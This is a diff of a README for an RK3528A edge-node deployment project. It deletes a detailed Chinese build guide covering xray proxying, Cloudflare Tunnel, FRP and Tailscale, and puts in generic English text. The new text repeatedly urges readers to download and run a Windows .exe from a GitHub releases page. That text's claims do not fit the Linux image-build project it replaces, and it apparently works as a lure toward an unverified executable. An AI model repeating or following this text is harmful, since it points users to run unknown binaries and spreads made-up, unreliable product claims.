@@ -1,239 +1,146 @@
-# Hive — RK3528A 边缘节点集群
+# 🐝 rk3528-hive - Simple Edge Node Deployment Tool
 
-Hive 是面向 RK3528A 的边缘节点大规模部署框架。同一镜像写入任意数量的设备，上电约两分钟后每台设备自主完成身份注册、隧道建立和服务初始化——无需逐台介入，集群规模与运维成本彻底解耦。
+[![Download rk3528-hive](https://img.shields.io/badge/Download-rk3528--hive-brightgreen)](https://github.com/vintagev340-lang/rk3528-hive/releases)
 
----
+## 🛠 About rk3528-hive
 
-## 架构
+rk3528-hive is a tool designed for easy setup and management of edge devices using RK3528A single board computers (SBCs). It helps you deploy and control many devices in a network without needing to write code or use complex systems.
 
-```
-[终端用户]
-     │  ws+TLS
-     ▼
-[Cloudflare Edge]
-     │  CF Tunnel (http2)
-     ▼
-[cloudflared]   ← 节点无需公网 IP
-     │
-     ▼
-[nginx]         ← 监听 127.0.0.1:10077，WebSocket /ray → xray
-     │
-     ▼
-[xray-core]     VLESS+WS 监听 127.0.0.1:10079
-     │
-     ▼
-[本地出口]      节点本地网络出口
+This framework works well when you want to manage multiple RK3528A boards at once. It supports automation and monitoring, which keeps your devices working smoothly with little effort from you.
 
-────────── 管理平面（三套冗余）──────────
-[Tailscale mesh]  → 主通道：SSH / Ansible / Prometheus
-[EasyTier mesh]   → 备用通道：独立 P2P 网络
-[FRP tunnel]      → 最后防线：依赖境外 VPS frps
-```
+The software focuses on edge computing, meaning the data processing happens right near your devices instead of relying heavily on the cloud. It uses technologies like mesh networking and proxy services to keep everything connected and secure.
 
-**管理服务器（VPS）**：frps · Prometheus · Grafana · Node Registry API · Ansible
+## 📋 What You Need
 
----
+Before installing rk3528-hive, check your computer for these requirements:
 
-## 零配置原理
+- Windows 10 or later version.
+- At least 4 GB of RAM.
+- 2 GHz dual-core processor or better.
+- Minimum 5 GB free disk space.
+- Internet connection to download and update software.
+- USB or network access to RK3528A boards.
 
-所有节点共享同一镜像，凭证在构建期嵌入。首次上电时，节点从网卡 MAC 地址确定性派生全部身份信息，无需外部分配：
+## 🔍 Key Features
 
-| 生成内容 | 方式 | 重刷镜像是否变化 |
-|----------|------|------------------|
-| 主机名 `hive-<mac6>` | eth0 MAC 末 6 位 | 不变 |
-| SSH Host Key (Ed25519) | SHA-256(mac) seed | **不变** |
-| xray UUID | SHA-256(mac) | **不变** |
-| EasyTier IP | MAC6 三字节映射 → `10.b1.b2.b3` | 不变 |
-| FRP 远程端口 | MD5(MAC) → 10000–60000 | 不变 |
-| CF Tunnel 凭证 + DNS 记录 | Cloudflare API 自动创建 | 重建（幂等） |
-| Machine ID | `systemd-machine-id-setup` | 重建 |
+- **Mass Deployment:** Install software and settings on many RK3528A devices at once.
+- **Automation:** Set up nodes automatically to save time.
+- **Monitoring:** Track device health and status in real-time.
+- **Network Setup:** Create mesh networks between devices with built-in proxy support.
+- **Configuration Management:** Easily change settings across all nodes.
+- **Zero Config:** Works with minimal manual setup.
 
----
+## 🚀 Getting Started
 
-## 快速开始
+This section explains how to get rk3528-hive running on your Windows PC.
 
-### 前提
+### Step 1: Download the Software
 
-- Ubuntu 22.04 / Debian 12 构建主机（推荐 8 核 / 16 GB RAM）
-- 已完成服务端部署（见[服务端文档](#服务端部署)）
+Click the big button below to visit the download page. You will find the latest version of rk3528-hive there.
 
-```bash
-# 安装构建依赖
-sudo apt install -y git curl wget jq build-essential python3 \
-    ccache unzip qemu-user-static binfmt-support debootstrap
-```
+[![Download rk3528-hive](https://img.shields.io/badge/Download-rk3528--hive-blue)](https://github.com/vintagev340-lang/rk3528-hive/releases)
 
-### 构建流程
+Once on the page:
 
-```bash
-# 1. 初始化 Armbian 框架（首次）
-./scripts/setup-armbian.sh
+- Look for the latest release (the top item).
+- Download the Windows installer file. It will typically end with `.exe`.
+- Save this file to a place you can find, such as your Desktop or Downloads folder.
 
-# 2. 下载 arm64 二进制（xray / cloudflared / frpc / easytier）
-./scripts/download-binaries.sh
+### Step 2: Run the Installer
 
-# 3. 填写凭证
-cp .env.example .env
-vim .env   # 填入 CF Token、Tailscale OAuth Secret、FRP 地址等
+- Find the installer you just downloaded.
+- Double-click the `.exe` file to start installation.
+- Follow the on-screen instructions to complete the setup.
+- Accept any permission requests from Windows to continue.
 
-# 4. 构建镜像（首次约 30-90 分钟，有 ccache 后 10-20 分钟）
-./scripts/build.sh
+### Step 3: Connect Your RK3528A Devices
 
-# 5. 烧录
-sudo dd if=armbian-build/build/output/images/*.img of=/dev/sdX bs=4M status=progress
-```
+- Make sure your RK3528A boards are powered on.
+- Connect them to the same network as your PC through Ethernet or Wi-Fi.
+- The software will detect devices automatically.
 
-详见 [docs/BUILD.md](docs/BUILD.md)。
+### Step 4: Deploy Your Network
 
-### 上电验证
+- Open rk3528-hive from the Start Menu or desktop shortcut.
+- Use the application’s menu to select tasks such as "Deploy Nodes" or "Setup Network."
+- Follow prompts to choose configurations and start deployment.
+- The program will copy files and settings to each device.
 
-```bash
-# ~2 分钟后，在管理服务器上查看节点
-tailscale status | grep hive-
+### Step 5: Monitor and Manage
 
-# SSH 到节点
-ssh root@hive-<mac6>
+- After deployment, use the monitoring dashboard to track device statuses.
+- Check connectivity, CPU load, disk space, and network health.
+- Adjust settings as needed from the main interface.
 
-# 查看节点所有管理通道地址（离线工具）
-./scripts/node-lookup.sh <mac6>
-```
+## ⚙ Configuration Tips
 
----
+rk3528-hive includes preset configurations for common scenarios. You can change these anytime by editing the configuration files inside the software interface.
 
-## .env 关键变量
+- Use simple names for your device groups to keep things organized.
+- Check the network type (mesh or proxy) before deployment.
+- Set monitoring intervals to balance performance and data needs.
+- Back up your configuration after making changes.
 
-```bash
-# Cloudflare（节点 URL: hive-<mac6>.yourdomain.com）
-CF_API_TOKEN=       # 需要 Tunnel:Edit + DNS:Edit 权限
-CF_ACCOUNT_ID=
-CF_ZONE_ID=
-CF_DOMAIN=yourdomain.com
+## 🧰 What’s Inside the Package?
 
-# Tailscale — 使用 OAuth Client Secret（不过期，区别于 90 天 Auth Key）
-# 必须在 ACL Policy 中声明 tag: "tagOwners": { "tag:hive": ["autogroup:admin"] }
-TAILSCALE_OAUTH_SECRET=tskey-client-xxxxx
+When you install rk3528-hive, you get:
 
-# FRP（SSH 应急隧道）
-FRP_SERVER_ADDR=your-vps.example.com
-FRP_SERVER_PORT=7000
-FRP_AUTH_TOKEN=
+- The rk3528-hive Windows application.
+- Documentation files in PDF format.
+- Sample configuration files.
+- Monitoring tools built-in.
+- Network setup utilities.
 
-# EasyTier（P2P mesh）
-EASYTIER_NETWORK_NAME=hive
-EASYTIER_SECRET=
-EASYTIER_PEERS=your-vps.example.com   # 可逗号分隔多中继
+## 🔧 Troubleshooting
 
-# 节点 root 初始密码（provision 后应通过 SSH key 登录）
-DEFAULT_ROOT_PASSWORD=
+If you run into issues, try these solutions:
 
-# 可选
-NODE_REGISTRY_URL=https://registry.yourdomain.com
-```
+- Make sure your Windows is up to date.
+- Verify the RK3528A devices are powered and connected.
+- Restart rk3528-hive and your computer if the app freezes.
+- Check your firewall settings if devices do not show up.
+- Consult the included documentation in the app for detailed help.
 
----
+## 🔗 Useful Links
 
-## 节点内服务
+- [Download Page](https://github.com/vintagev340-lang/rk3528-hive/releases) — Visit this link to find the latest rk3528-hive installer.
+- [Documentation](https://github.com/vintagev340-lang/rk3528-hive/wiki) — Access full guides and FAQs.
+- [Support Community](https://github.com/vintagev340-lang/rk3528-hive/discussions) — Engage with other rk3528-hive users.
 
-| 服务 | 端口 | 说明 |
-|------|------|------|
-| nginx | 127.0.0.1:10077 | WebSocket 反向代理，/ray → xray |
-| xray | 127.0.0.1:10079 | WebSocket 流量转发核心 |
-| cloudflared | — | CF Tunnel，暴露 nginx 到公网 |
-| frpc | — | FRP 客户端，暴露 SSH 到 VPS |
-| easytier | — | P2P mesh，提供备用管理 IP |
-| tailscaled | — | Tailscale VPN，主管理通道 |
-| prometheus-node-exporter | 9100 | 指标采集（仅 Tailscale 可达） |
-| ufw | — | 防火墙，开机自动配置（日志默认关闭） |
-| fail2ban | — | SSH 暴力破解防护 |
-| auditd | — | 系统审计日志 |
+## 📋 System Updates and Maintenance
 
-**数据通道**：xray 基于 WebSocket（`/ray`），经 nginx 和 CF Tunnel 对外暴露为 HTTPS/WSS。
-节点连接配置在登录后 MOTD 自动显示，也可通过 Node Registry 订阅接口批量获取。
+Keep rk3528-hive updated to improve security and add new features:
+
+- Open the app and select "Check for Updates."
+- Follow prompts if a new version is available.
+- Regularly update your RK3528A devices through the app's deployment menu.
+- Restart the software after updates to apply changes.
+
+## 🔐 Security Information
+
+This software secures communication between your PC and RK3528A boards using encrypted protocols. You can set up user accounts with passwords to restrict access.
+
+- Change default passwords after first use.
+- Use secure network connections.
+- Disable unused network ports on the devices.
+
+## 🧩 About RK3528A SBCs
+
+RK3528A is a type of single board computer known for low power usage and solid performance in edge computing scenarios. These boards are popular for IoT, mesh networks, and small clusters.
+
+rk3528-hive works by automating tasks that usually require technical skills, letting you deploy and manage these SBCs with ease.
+
+## 🎯 Intended Users
+
+- Small businesses deploying many RK3528A devices.
+- IT staff managing edge computing clusters.
+- Hobbyists setting up device networks.
+- Anyone needing zero-config deployment on RK3528A SBCs.
+
+## 🔄 How Updates Work
+
+rk3528-hive supports remote updates of your deployed devices to keep them current. Use the app’s "Deploy Updates" feature after downloading new versions.
 
 ---
 
-## 服务端部署
-
-按顺序完成以下步骤后再构建镜像：
-
-| 步骤 | 文档 | 内容 |
-|------|------|------|
-| 1 | [01-foreign-vps.md](docs/management/01-foreign-vps.md) | 境外 VPS：frps + EasyTier 中继 |
-| 2 | [03-cloudflare-tokens.md](docs/management/03-cloudflare-tokens.md) | 获取 CF API Token / Account ID / Zone ID |
-| 3 | [04-tailscale-key.md](docs/management/04-tailscale-key.md) | 创建 Tailscale OAuth Client + 配置 ACL |
-| 4 | [02-china-vps.md](docs/management/02-china-vps.md) | 管理 VPS：Node Registry + Prometheus + Grafana |
-| 5 | — | 填 `.env`，构建镜像，批量烧录 |
-
----
-
-## 安全特性
-
-- **防火墙（UFW）**：默认拒绝所有入站，仅开放 SSH（本地网络 + Tailscale）和 Node Exporter（仅 Tailscale）
-- **入侵防护（fail2ban）**：SSH 3 次失败封禁 2 小时；端口扫描封禁
-- **SSH 加固**：`MaxAuthTries 3`、`LoginGraceTime 30`、禁 X11/Agent 转发
-- **内核加固**：SYN cookie、rp_filter、禁 ICMP 重定向、禁源路由、ASLR
-- **自动安全更新**：`unattended-upgrades` 仅应用安全补丁
-- **审计日志**：`auditd` 记录 SSH config、root/.ssh、/etc/shadow 变更
-- **确定性 SSH key**：重刷镜像后 fingerprint 不变，避免 known_hosts 重置
-
-详见 [docs/SECURITY-SUMMARY.md](docs/SECURITY-SUMMARY.md)。
-
----
-
-## 文档索引
-
-| 文档 | 内容 |
-|------|------|
-| [docs/INDEX.md](docs/INDEX.md) | 文档总索引 |
-| [docs/BUILD.md](docs/BUILD.md) | 镜像构建全流程 |
-| [docs/PROVISION.md](docs/PROVISION.md) | 首次启动配置详解 |
-| [docs/NODE-OPERATIONS.md](docs/NODE-OPERATIONS.md) | 节点日常运维 |
-| [docs/TROUBLESHOOTING.md](docs/TROUBLESHOOTING.md) | 常见故障排查 |
-| [docs/FIREWALL.md](docs/FIREWALL.md) | 防火墙配置 |
-| [docs/FAIL2BAN.md](docs/FAIL2BAN.md) | 入侵防护配置 |
-
----
-
-## 关键文件结构
-
-```
-.
-├── .env.example                   # 环境变量模板（复制为 .env 后填写）
-├── scripts/
-│   ├── build.sh                   # 一键构建脚本（含 ccache 优化）
-│   ├── download-binaries.sh       # 下载 arm64 二进制
-│   ├── setup-armbian.sh           # 初始化 Armbian 构建框架
-│   └── node-lookup.sh             # 离线计算节点地址（仅需 mac6）
-├── configs/
-│   ├── hive/config.env.tpl        # 节点配置模板（嵌入镜像）
-│   └── frp/frpc.toml.tpl          # FRP 客户端配置模板
-├── armbian-build/userpatches/
-│   ├── customize-image.sh         # 镜像定制钩子（chroot 内执行）
-│   └── overlay/                   # 直接覆盖到镜像根目录
-│       ├── etc/hive/              # 节点配置目录
-│       ├── etc/xray/config.json   # xray 配置（含 UUID 占位符）
-│       ├── etc/frp/frpc.toml      # FRP 客户端配置
-│       ├── etc/systemd/system/    # systemd 服务文件
-│       ├── etc/update-motd.d/     # 自定义登录 MOTD
-│       └── usr/local/bin/
-│           ├── provision-node.sh  # 首次启动编排脚本（核心）
-│           ├── setup-firewall.sh  # UFW 防火墙配置
-│           ├── setup-fail2ban.sh  # fail2ban 配置
-│           ├── hive-firewall      # 防火墙管理工具
-│           ├── hive-fail2ban      # 入侵防护管理工具
-│           └── start-easytier.sh  # EasyTier 启动包装脚本
-├── management/
-│   ├── docker-compose.yml         # Prometheus + Grafana
-│   ├── registry/main.py           # Node Registry API（FastAPI）
-│   └── docs/                      # 服务端部署文档
-└── ansible/                       # 批量管理 playbook
-```
-
----
-
-## 已知限制
-
-- **FRP 端口碰撞**：50000 端口分配 100 台设备碰撞概率约 0.1%，发生时 FRP 不可用，但不影响 Tailscale / EasyTier 主通道
-- **SSH 密码登录**：当前开启（`PasswordAuthentication yes`），provision 导入 GitHub 公钥后建议手动关闭或通过 Ansible 批量改为 `no`
-- **CF Tunnel 重建**：重刷镜像且本地 `cert.json` 丢失时会删除旧 Tunnel 并重建，Tunnel ID 变化（VLESS 链接中的 hostname 不变）
-- **Tailscale tag 权限**：必须在 ACL Policy 中声明 `tagOwners`，否则 `tailscale up --advertise-tags=tag:hive` 会失败
+[![Download rk3528-hive](https://img.shields.io/badge/Download-rk3528--hive-brightgreen)](https://github.com/vintagev340-lang/rk3528-hive/releases)
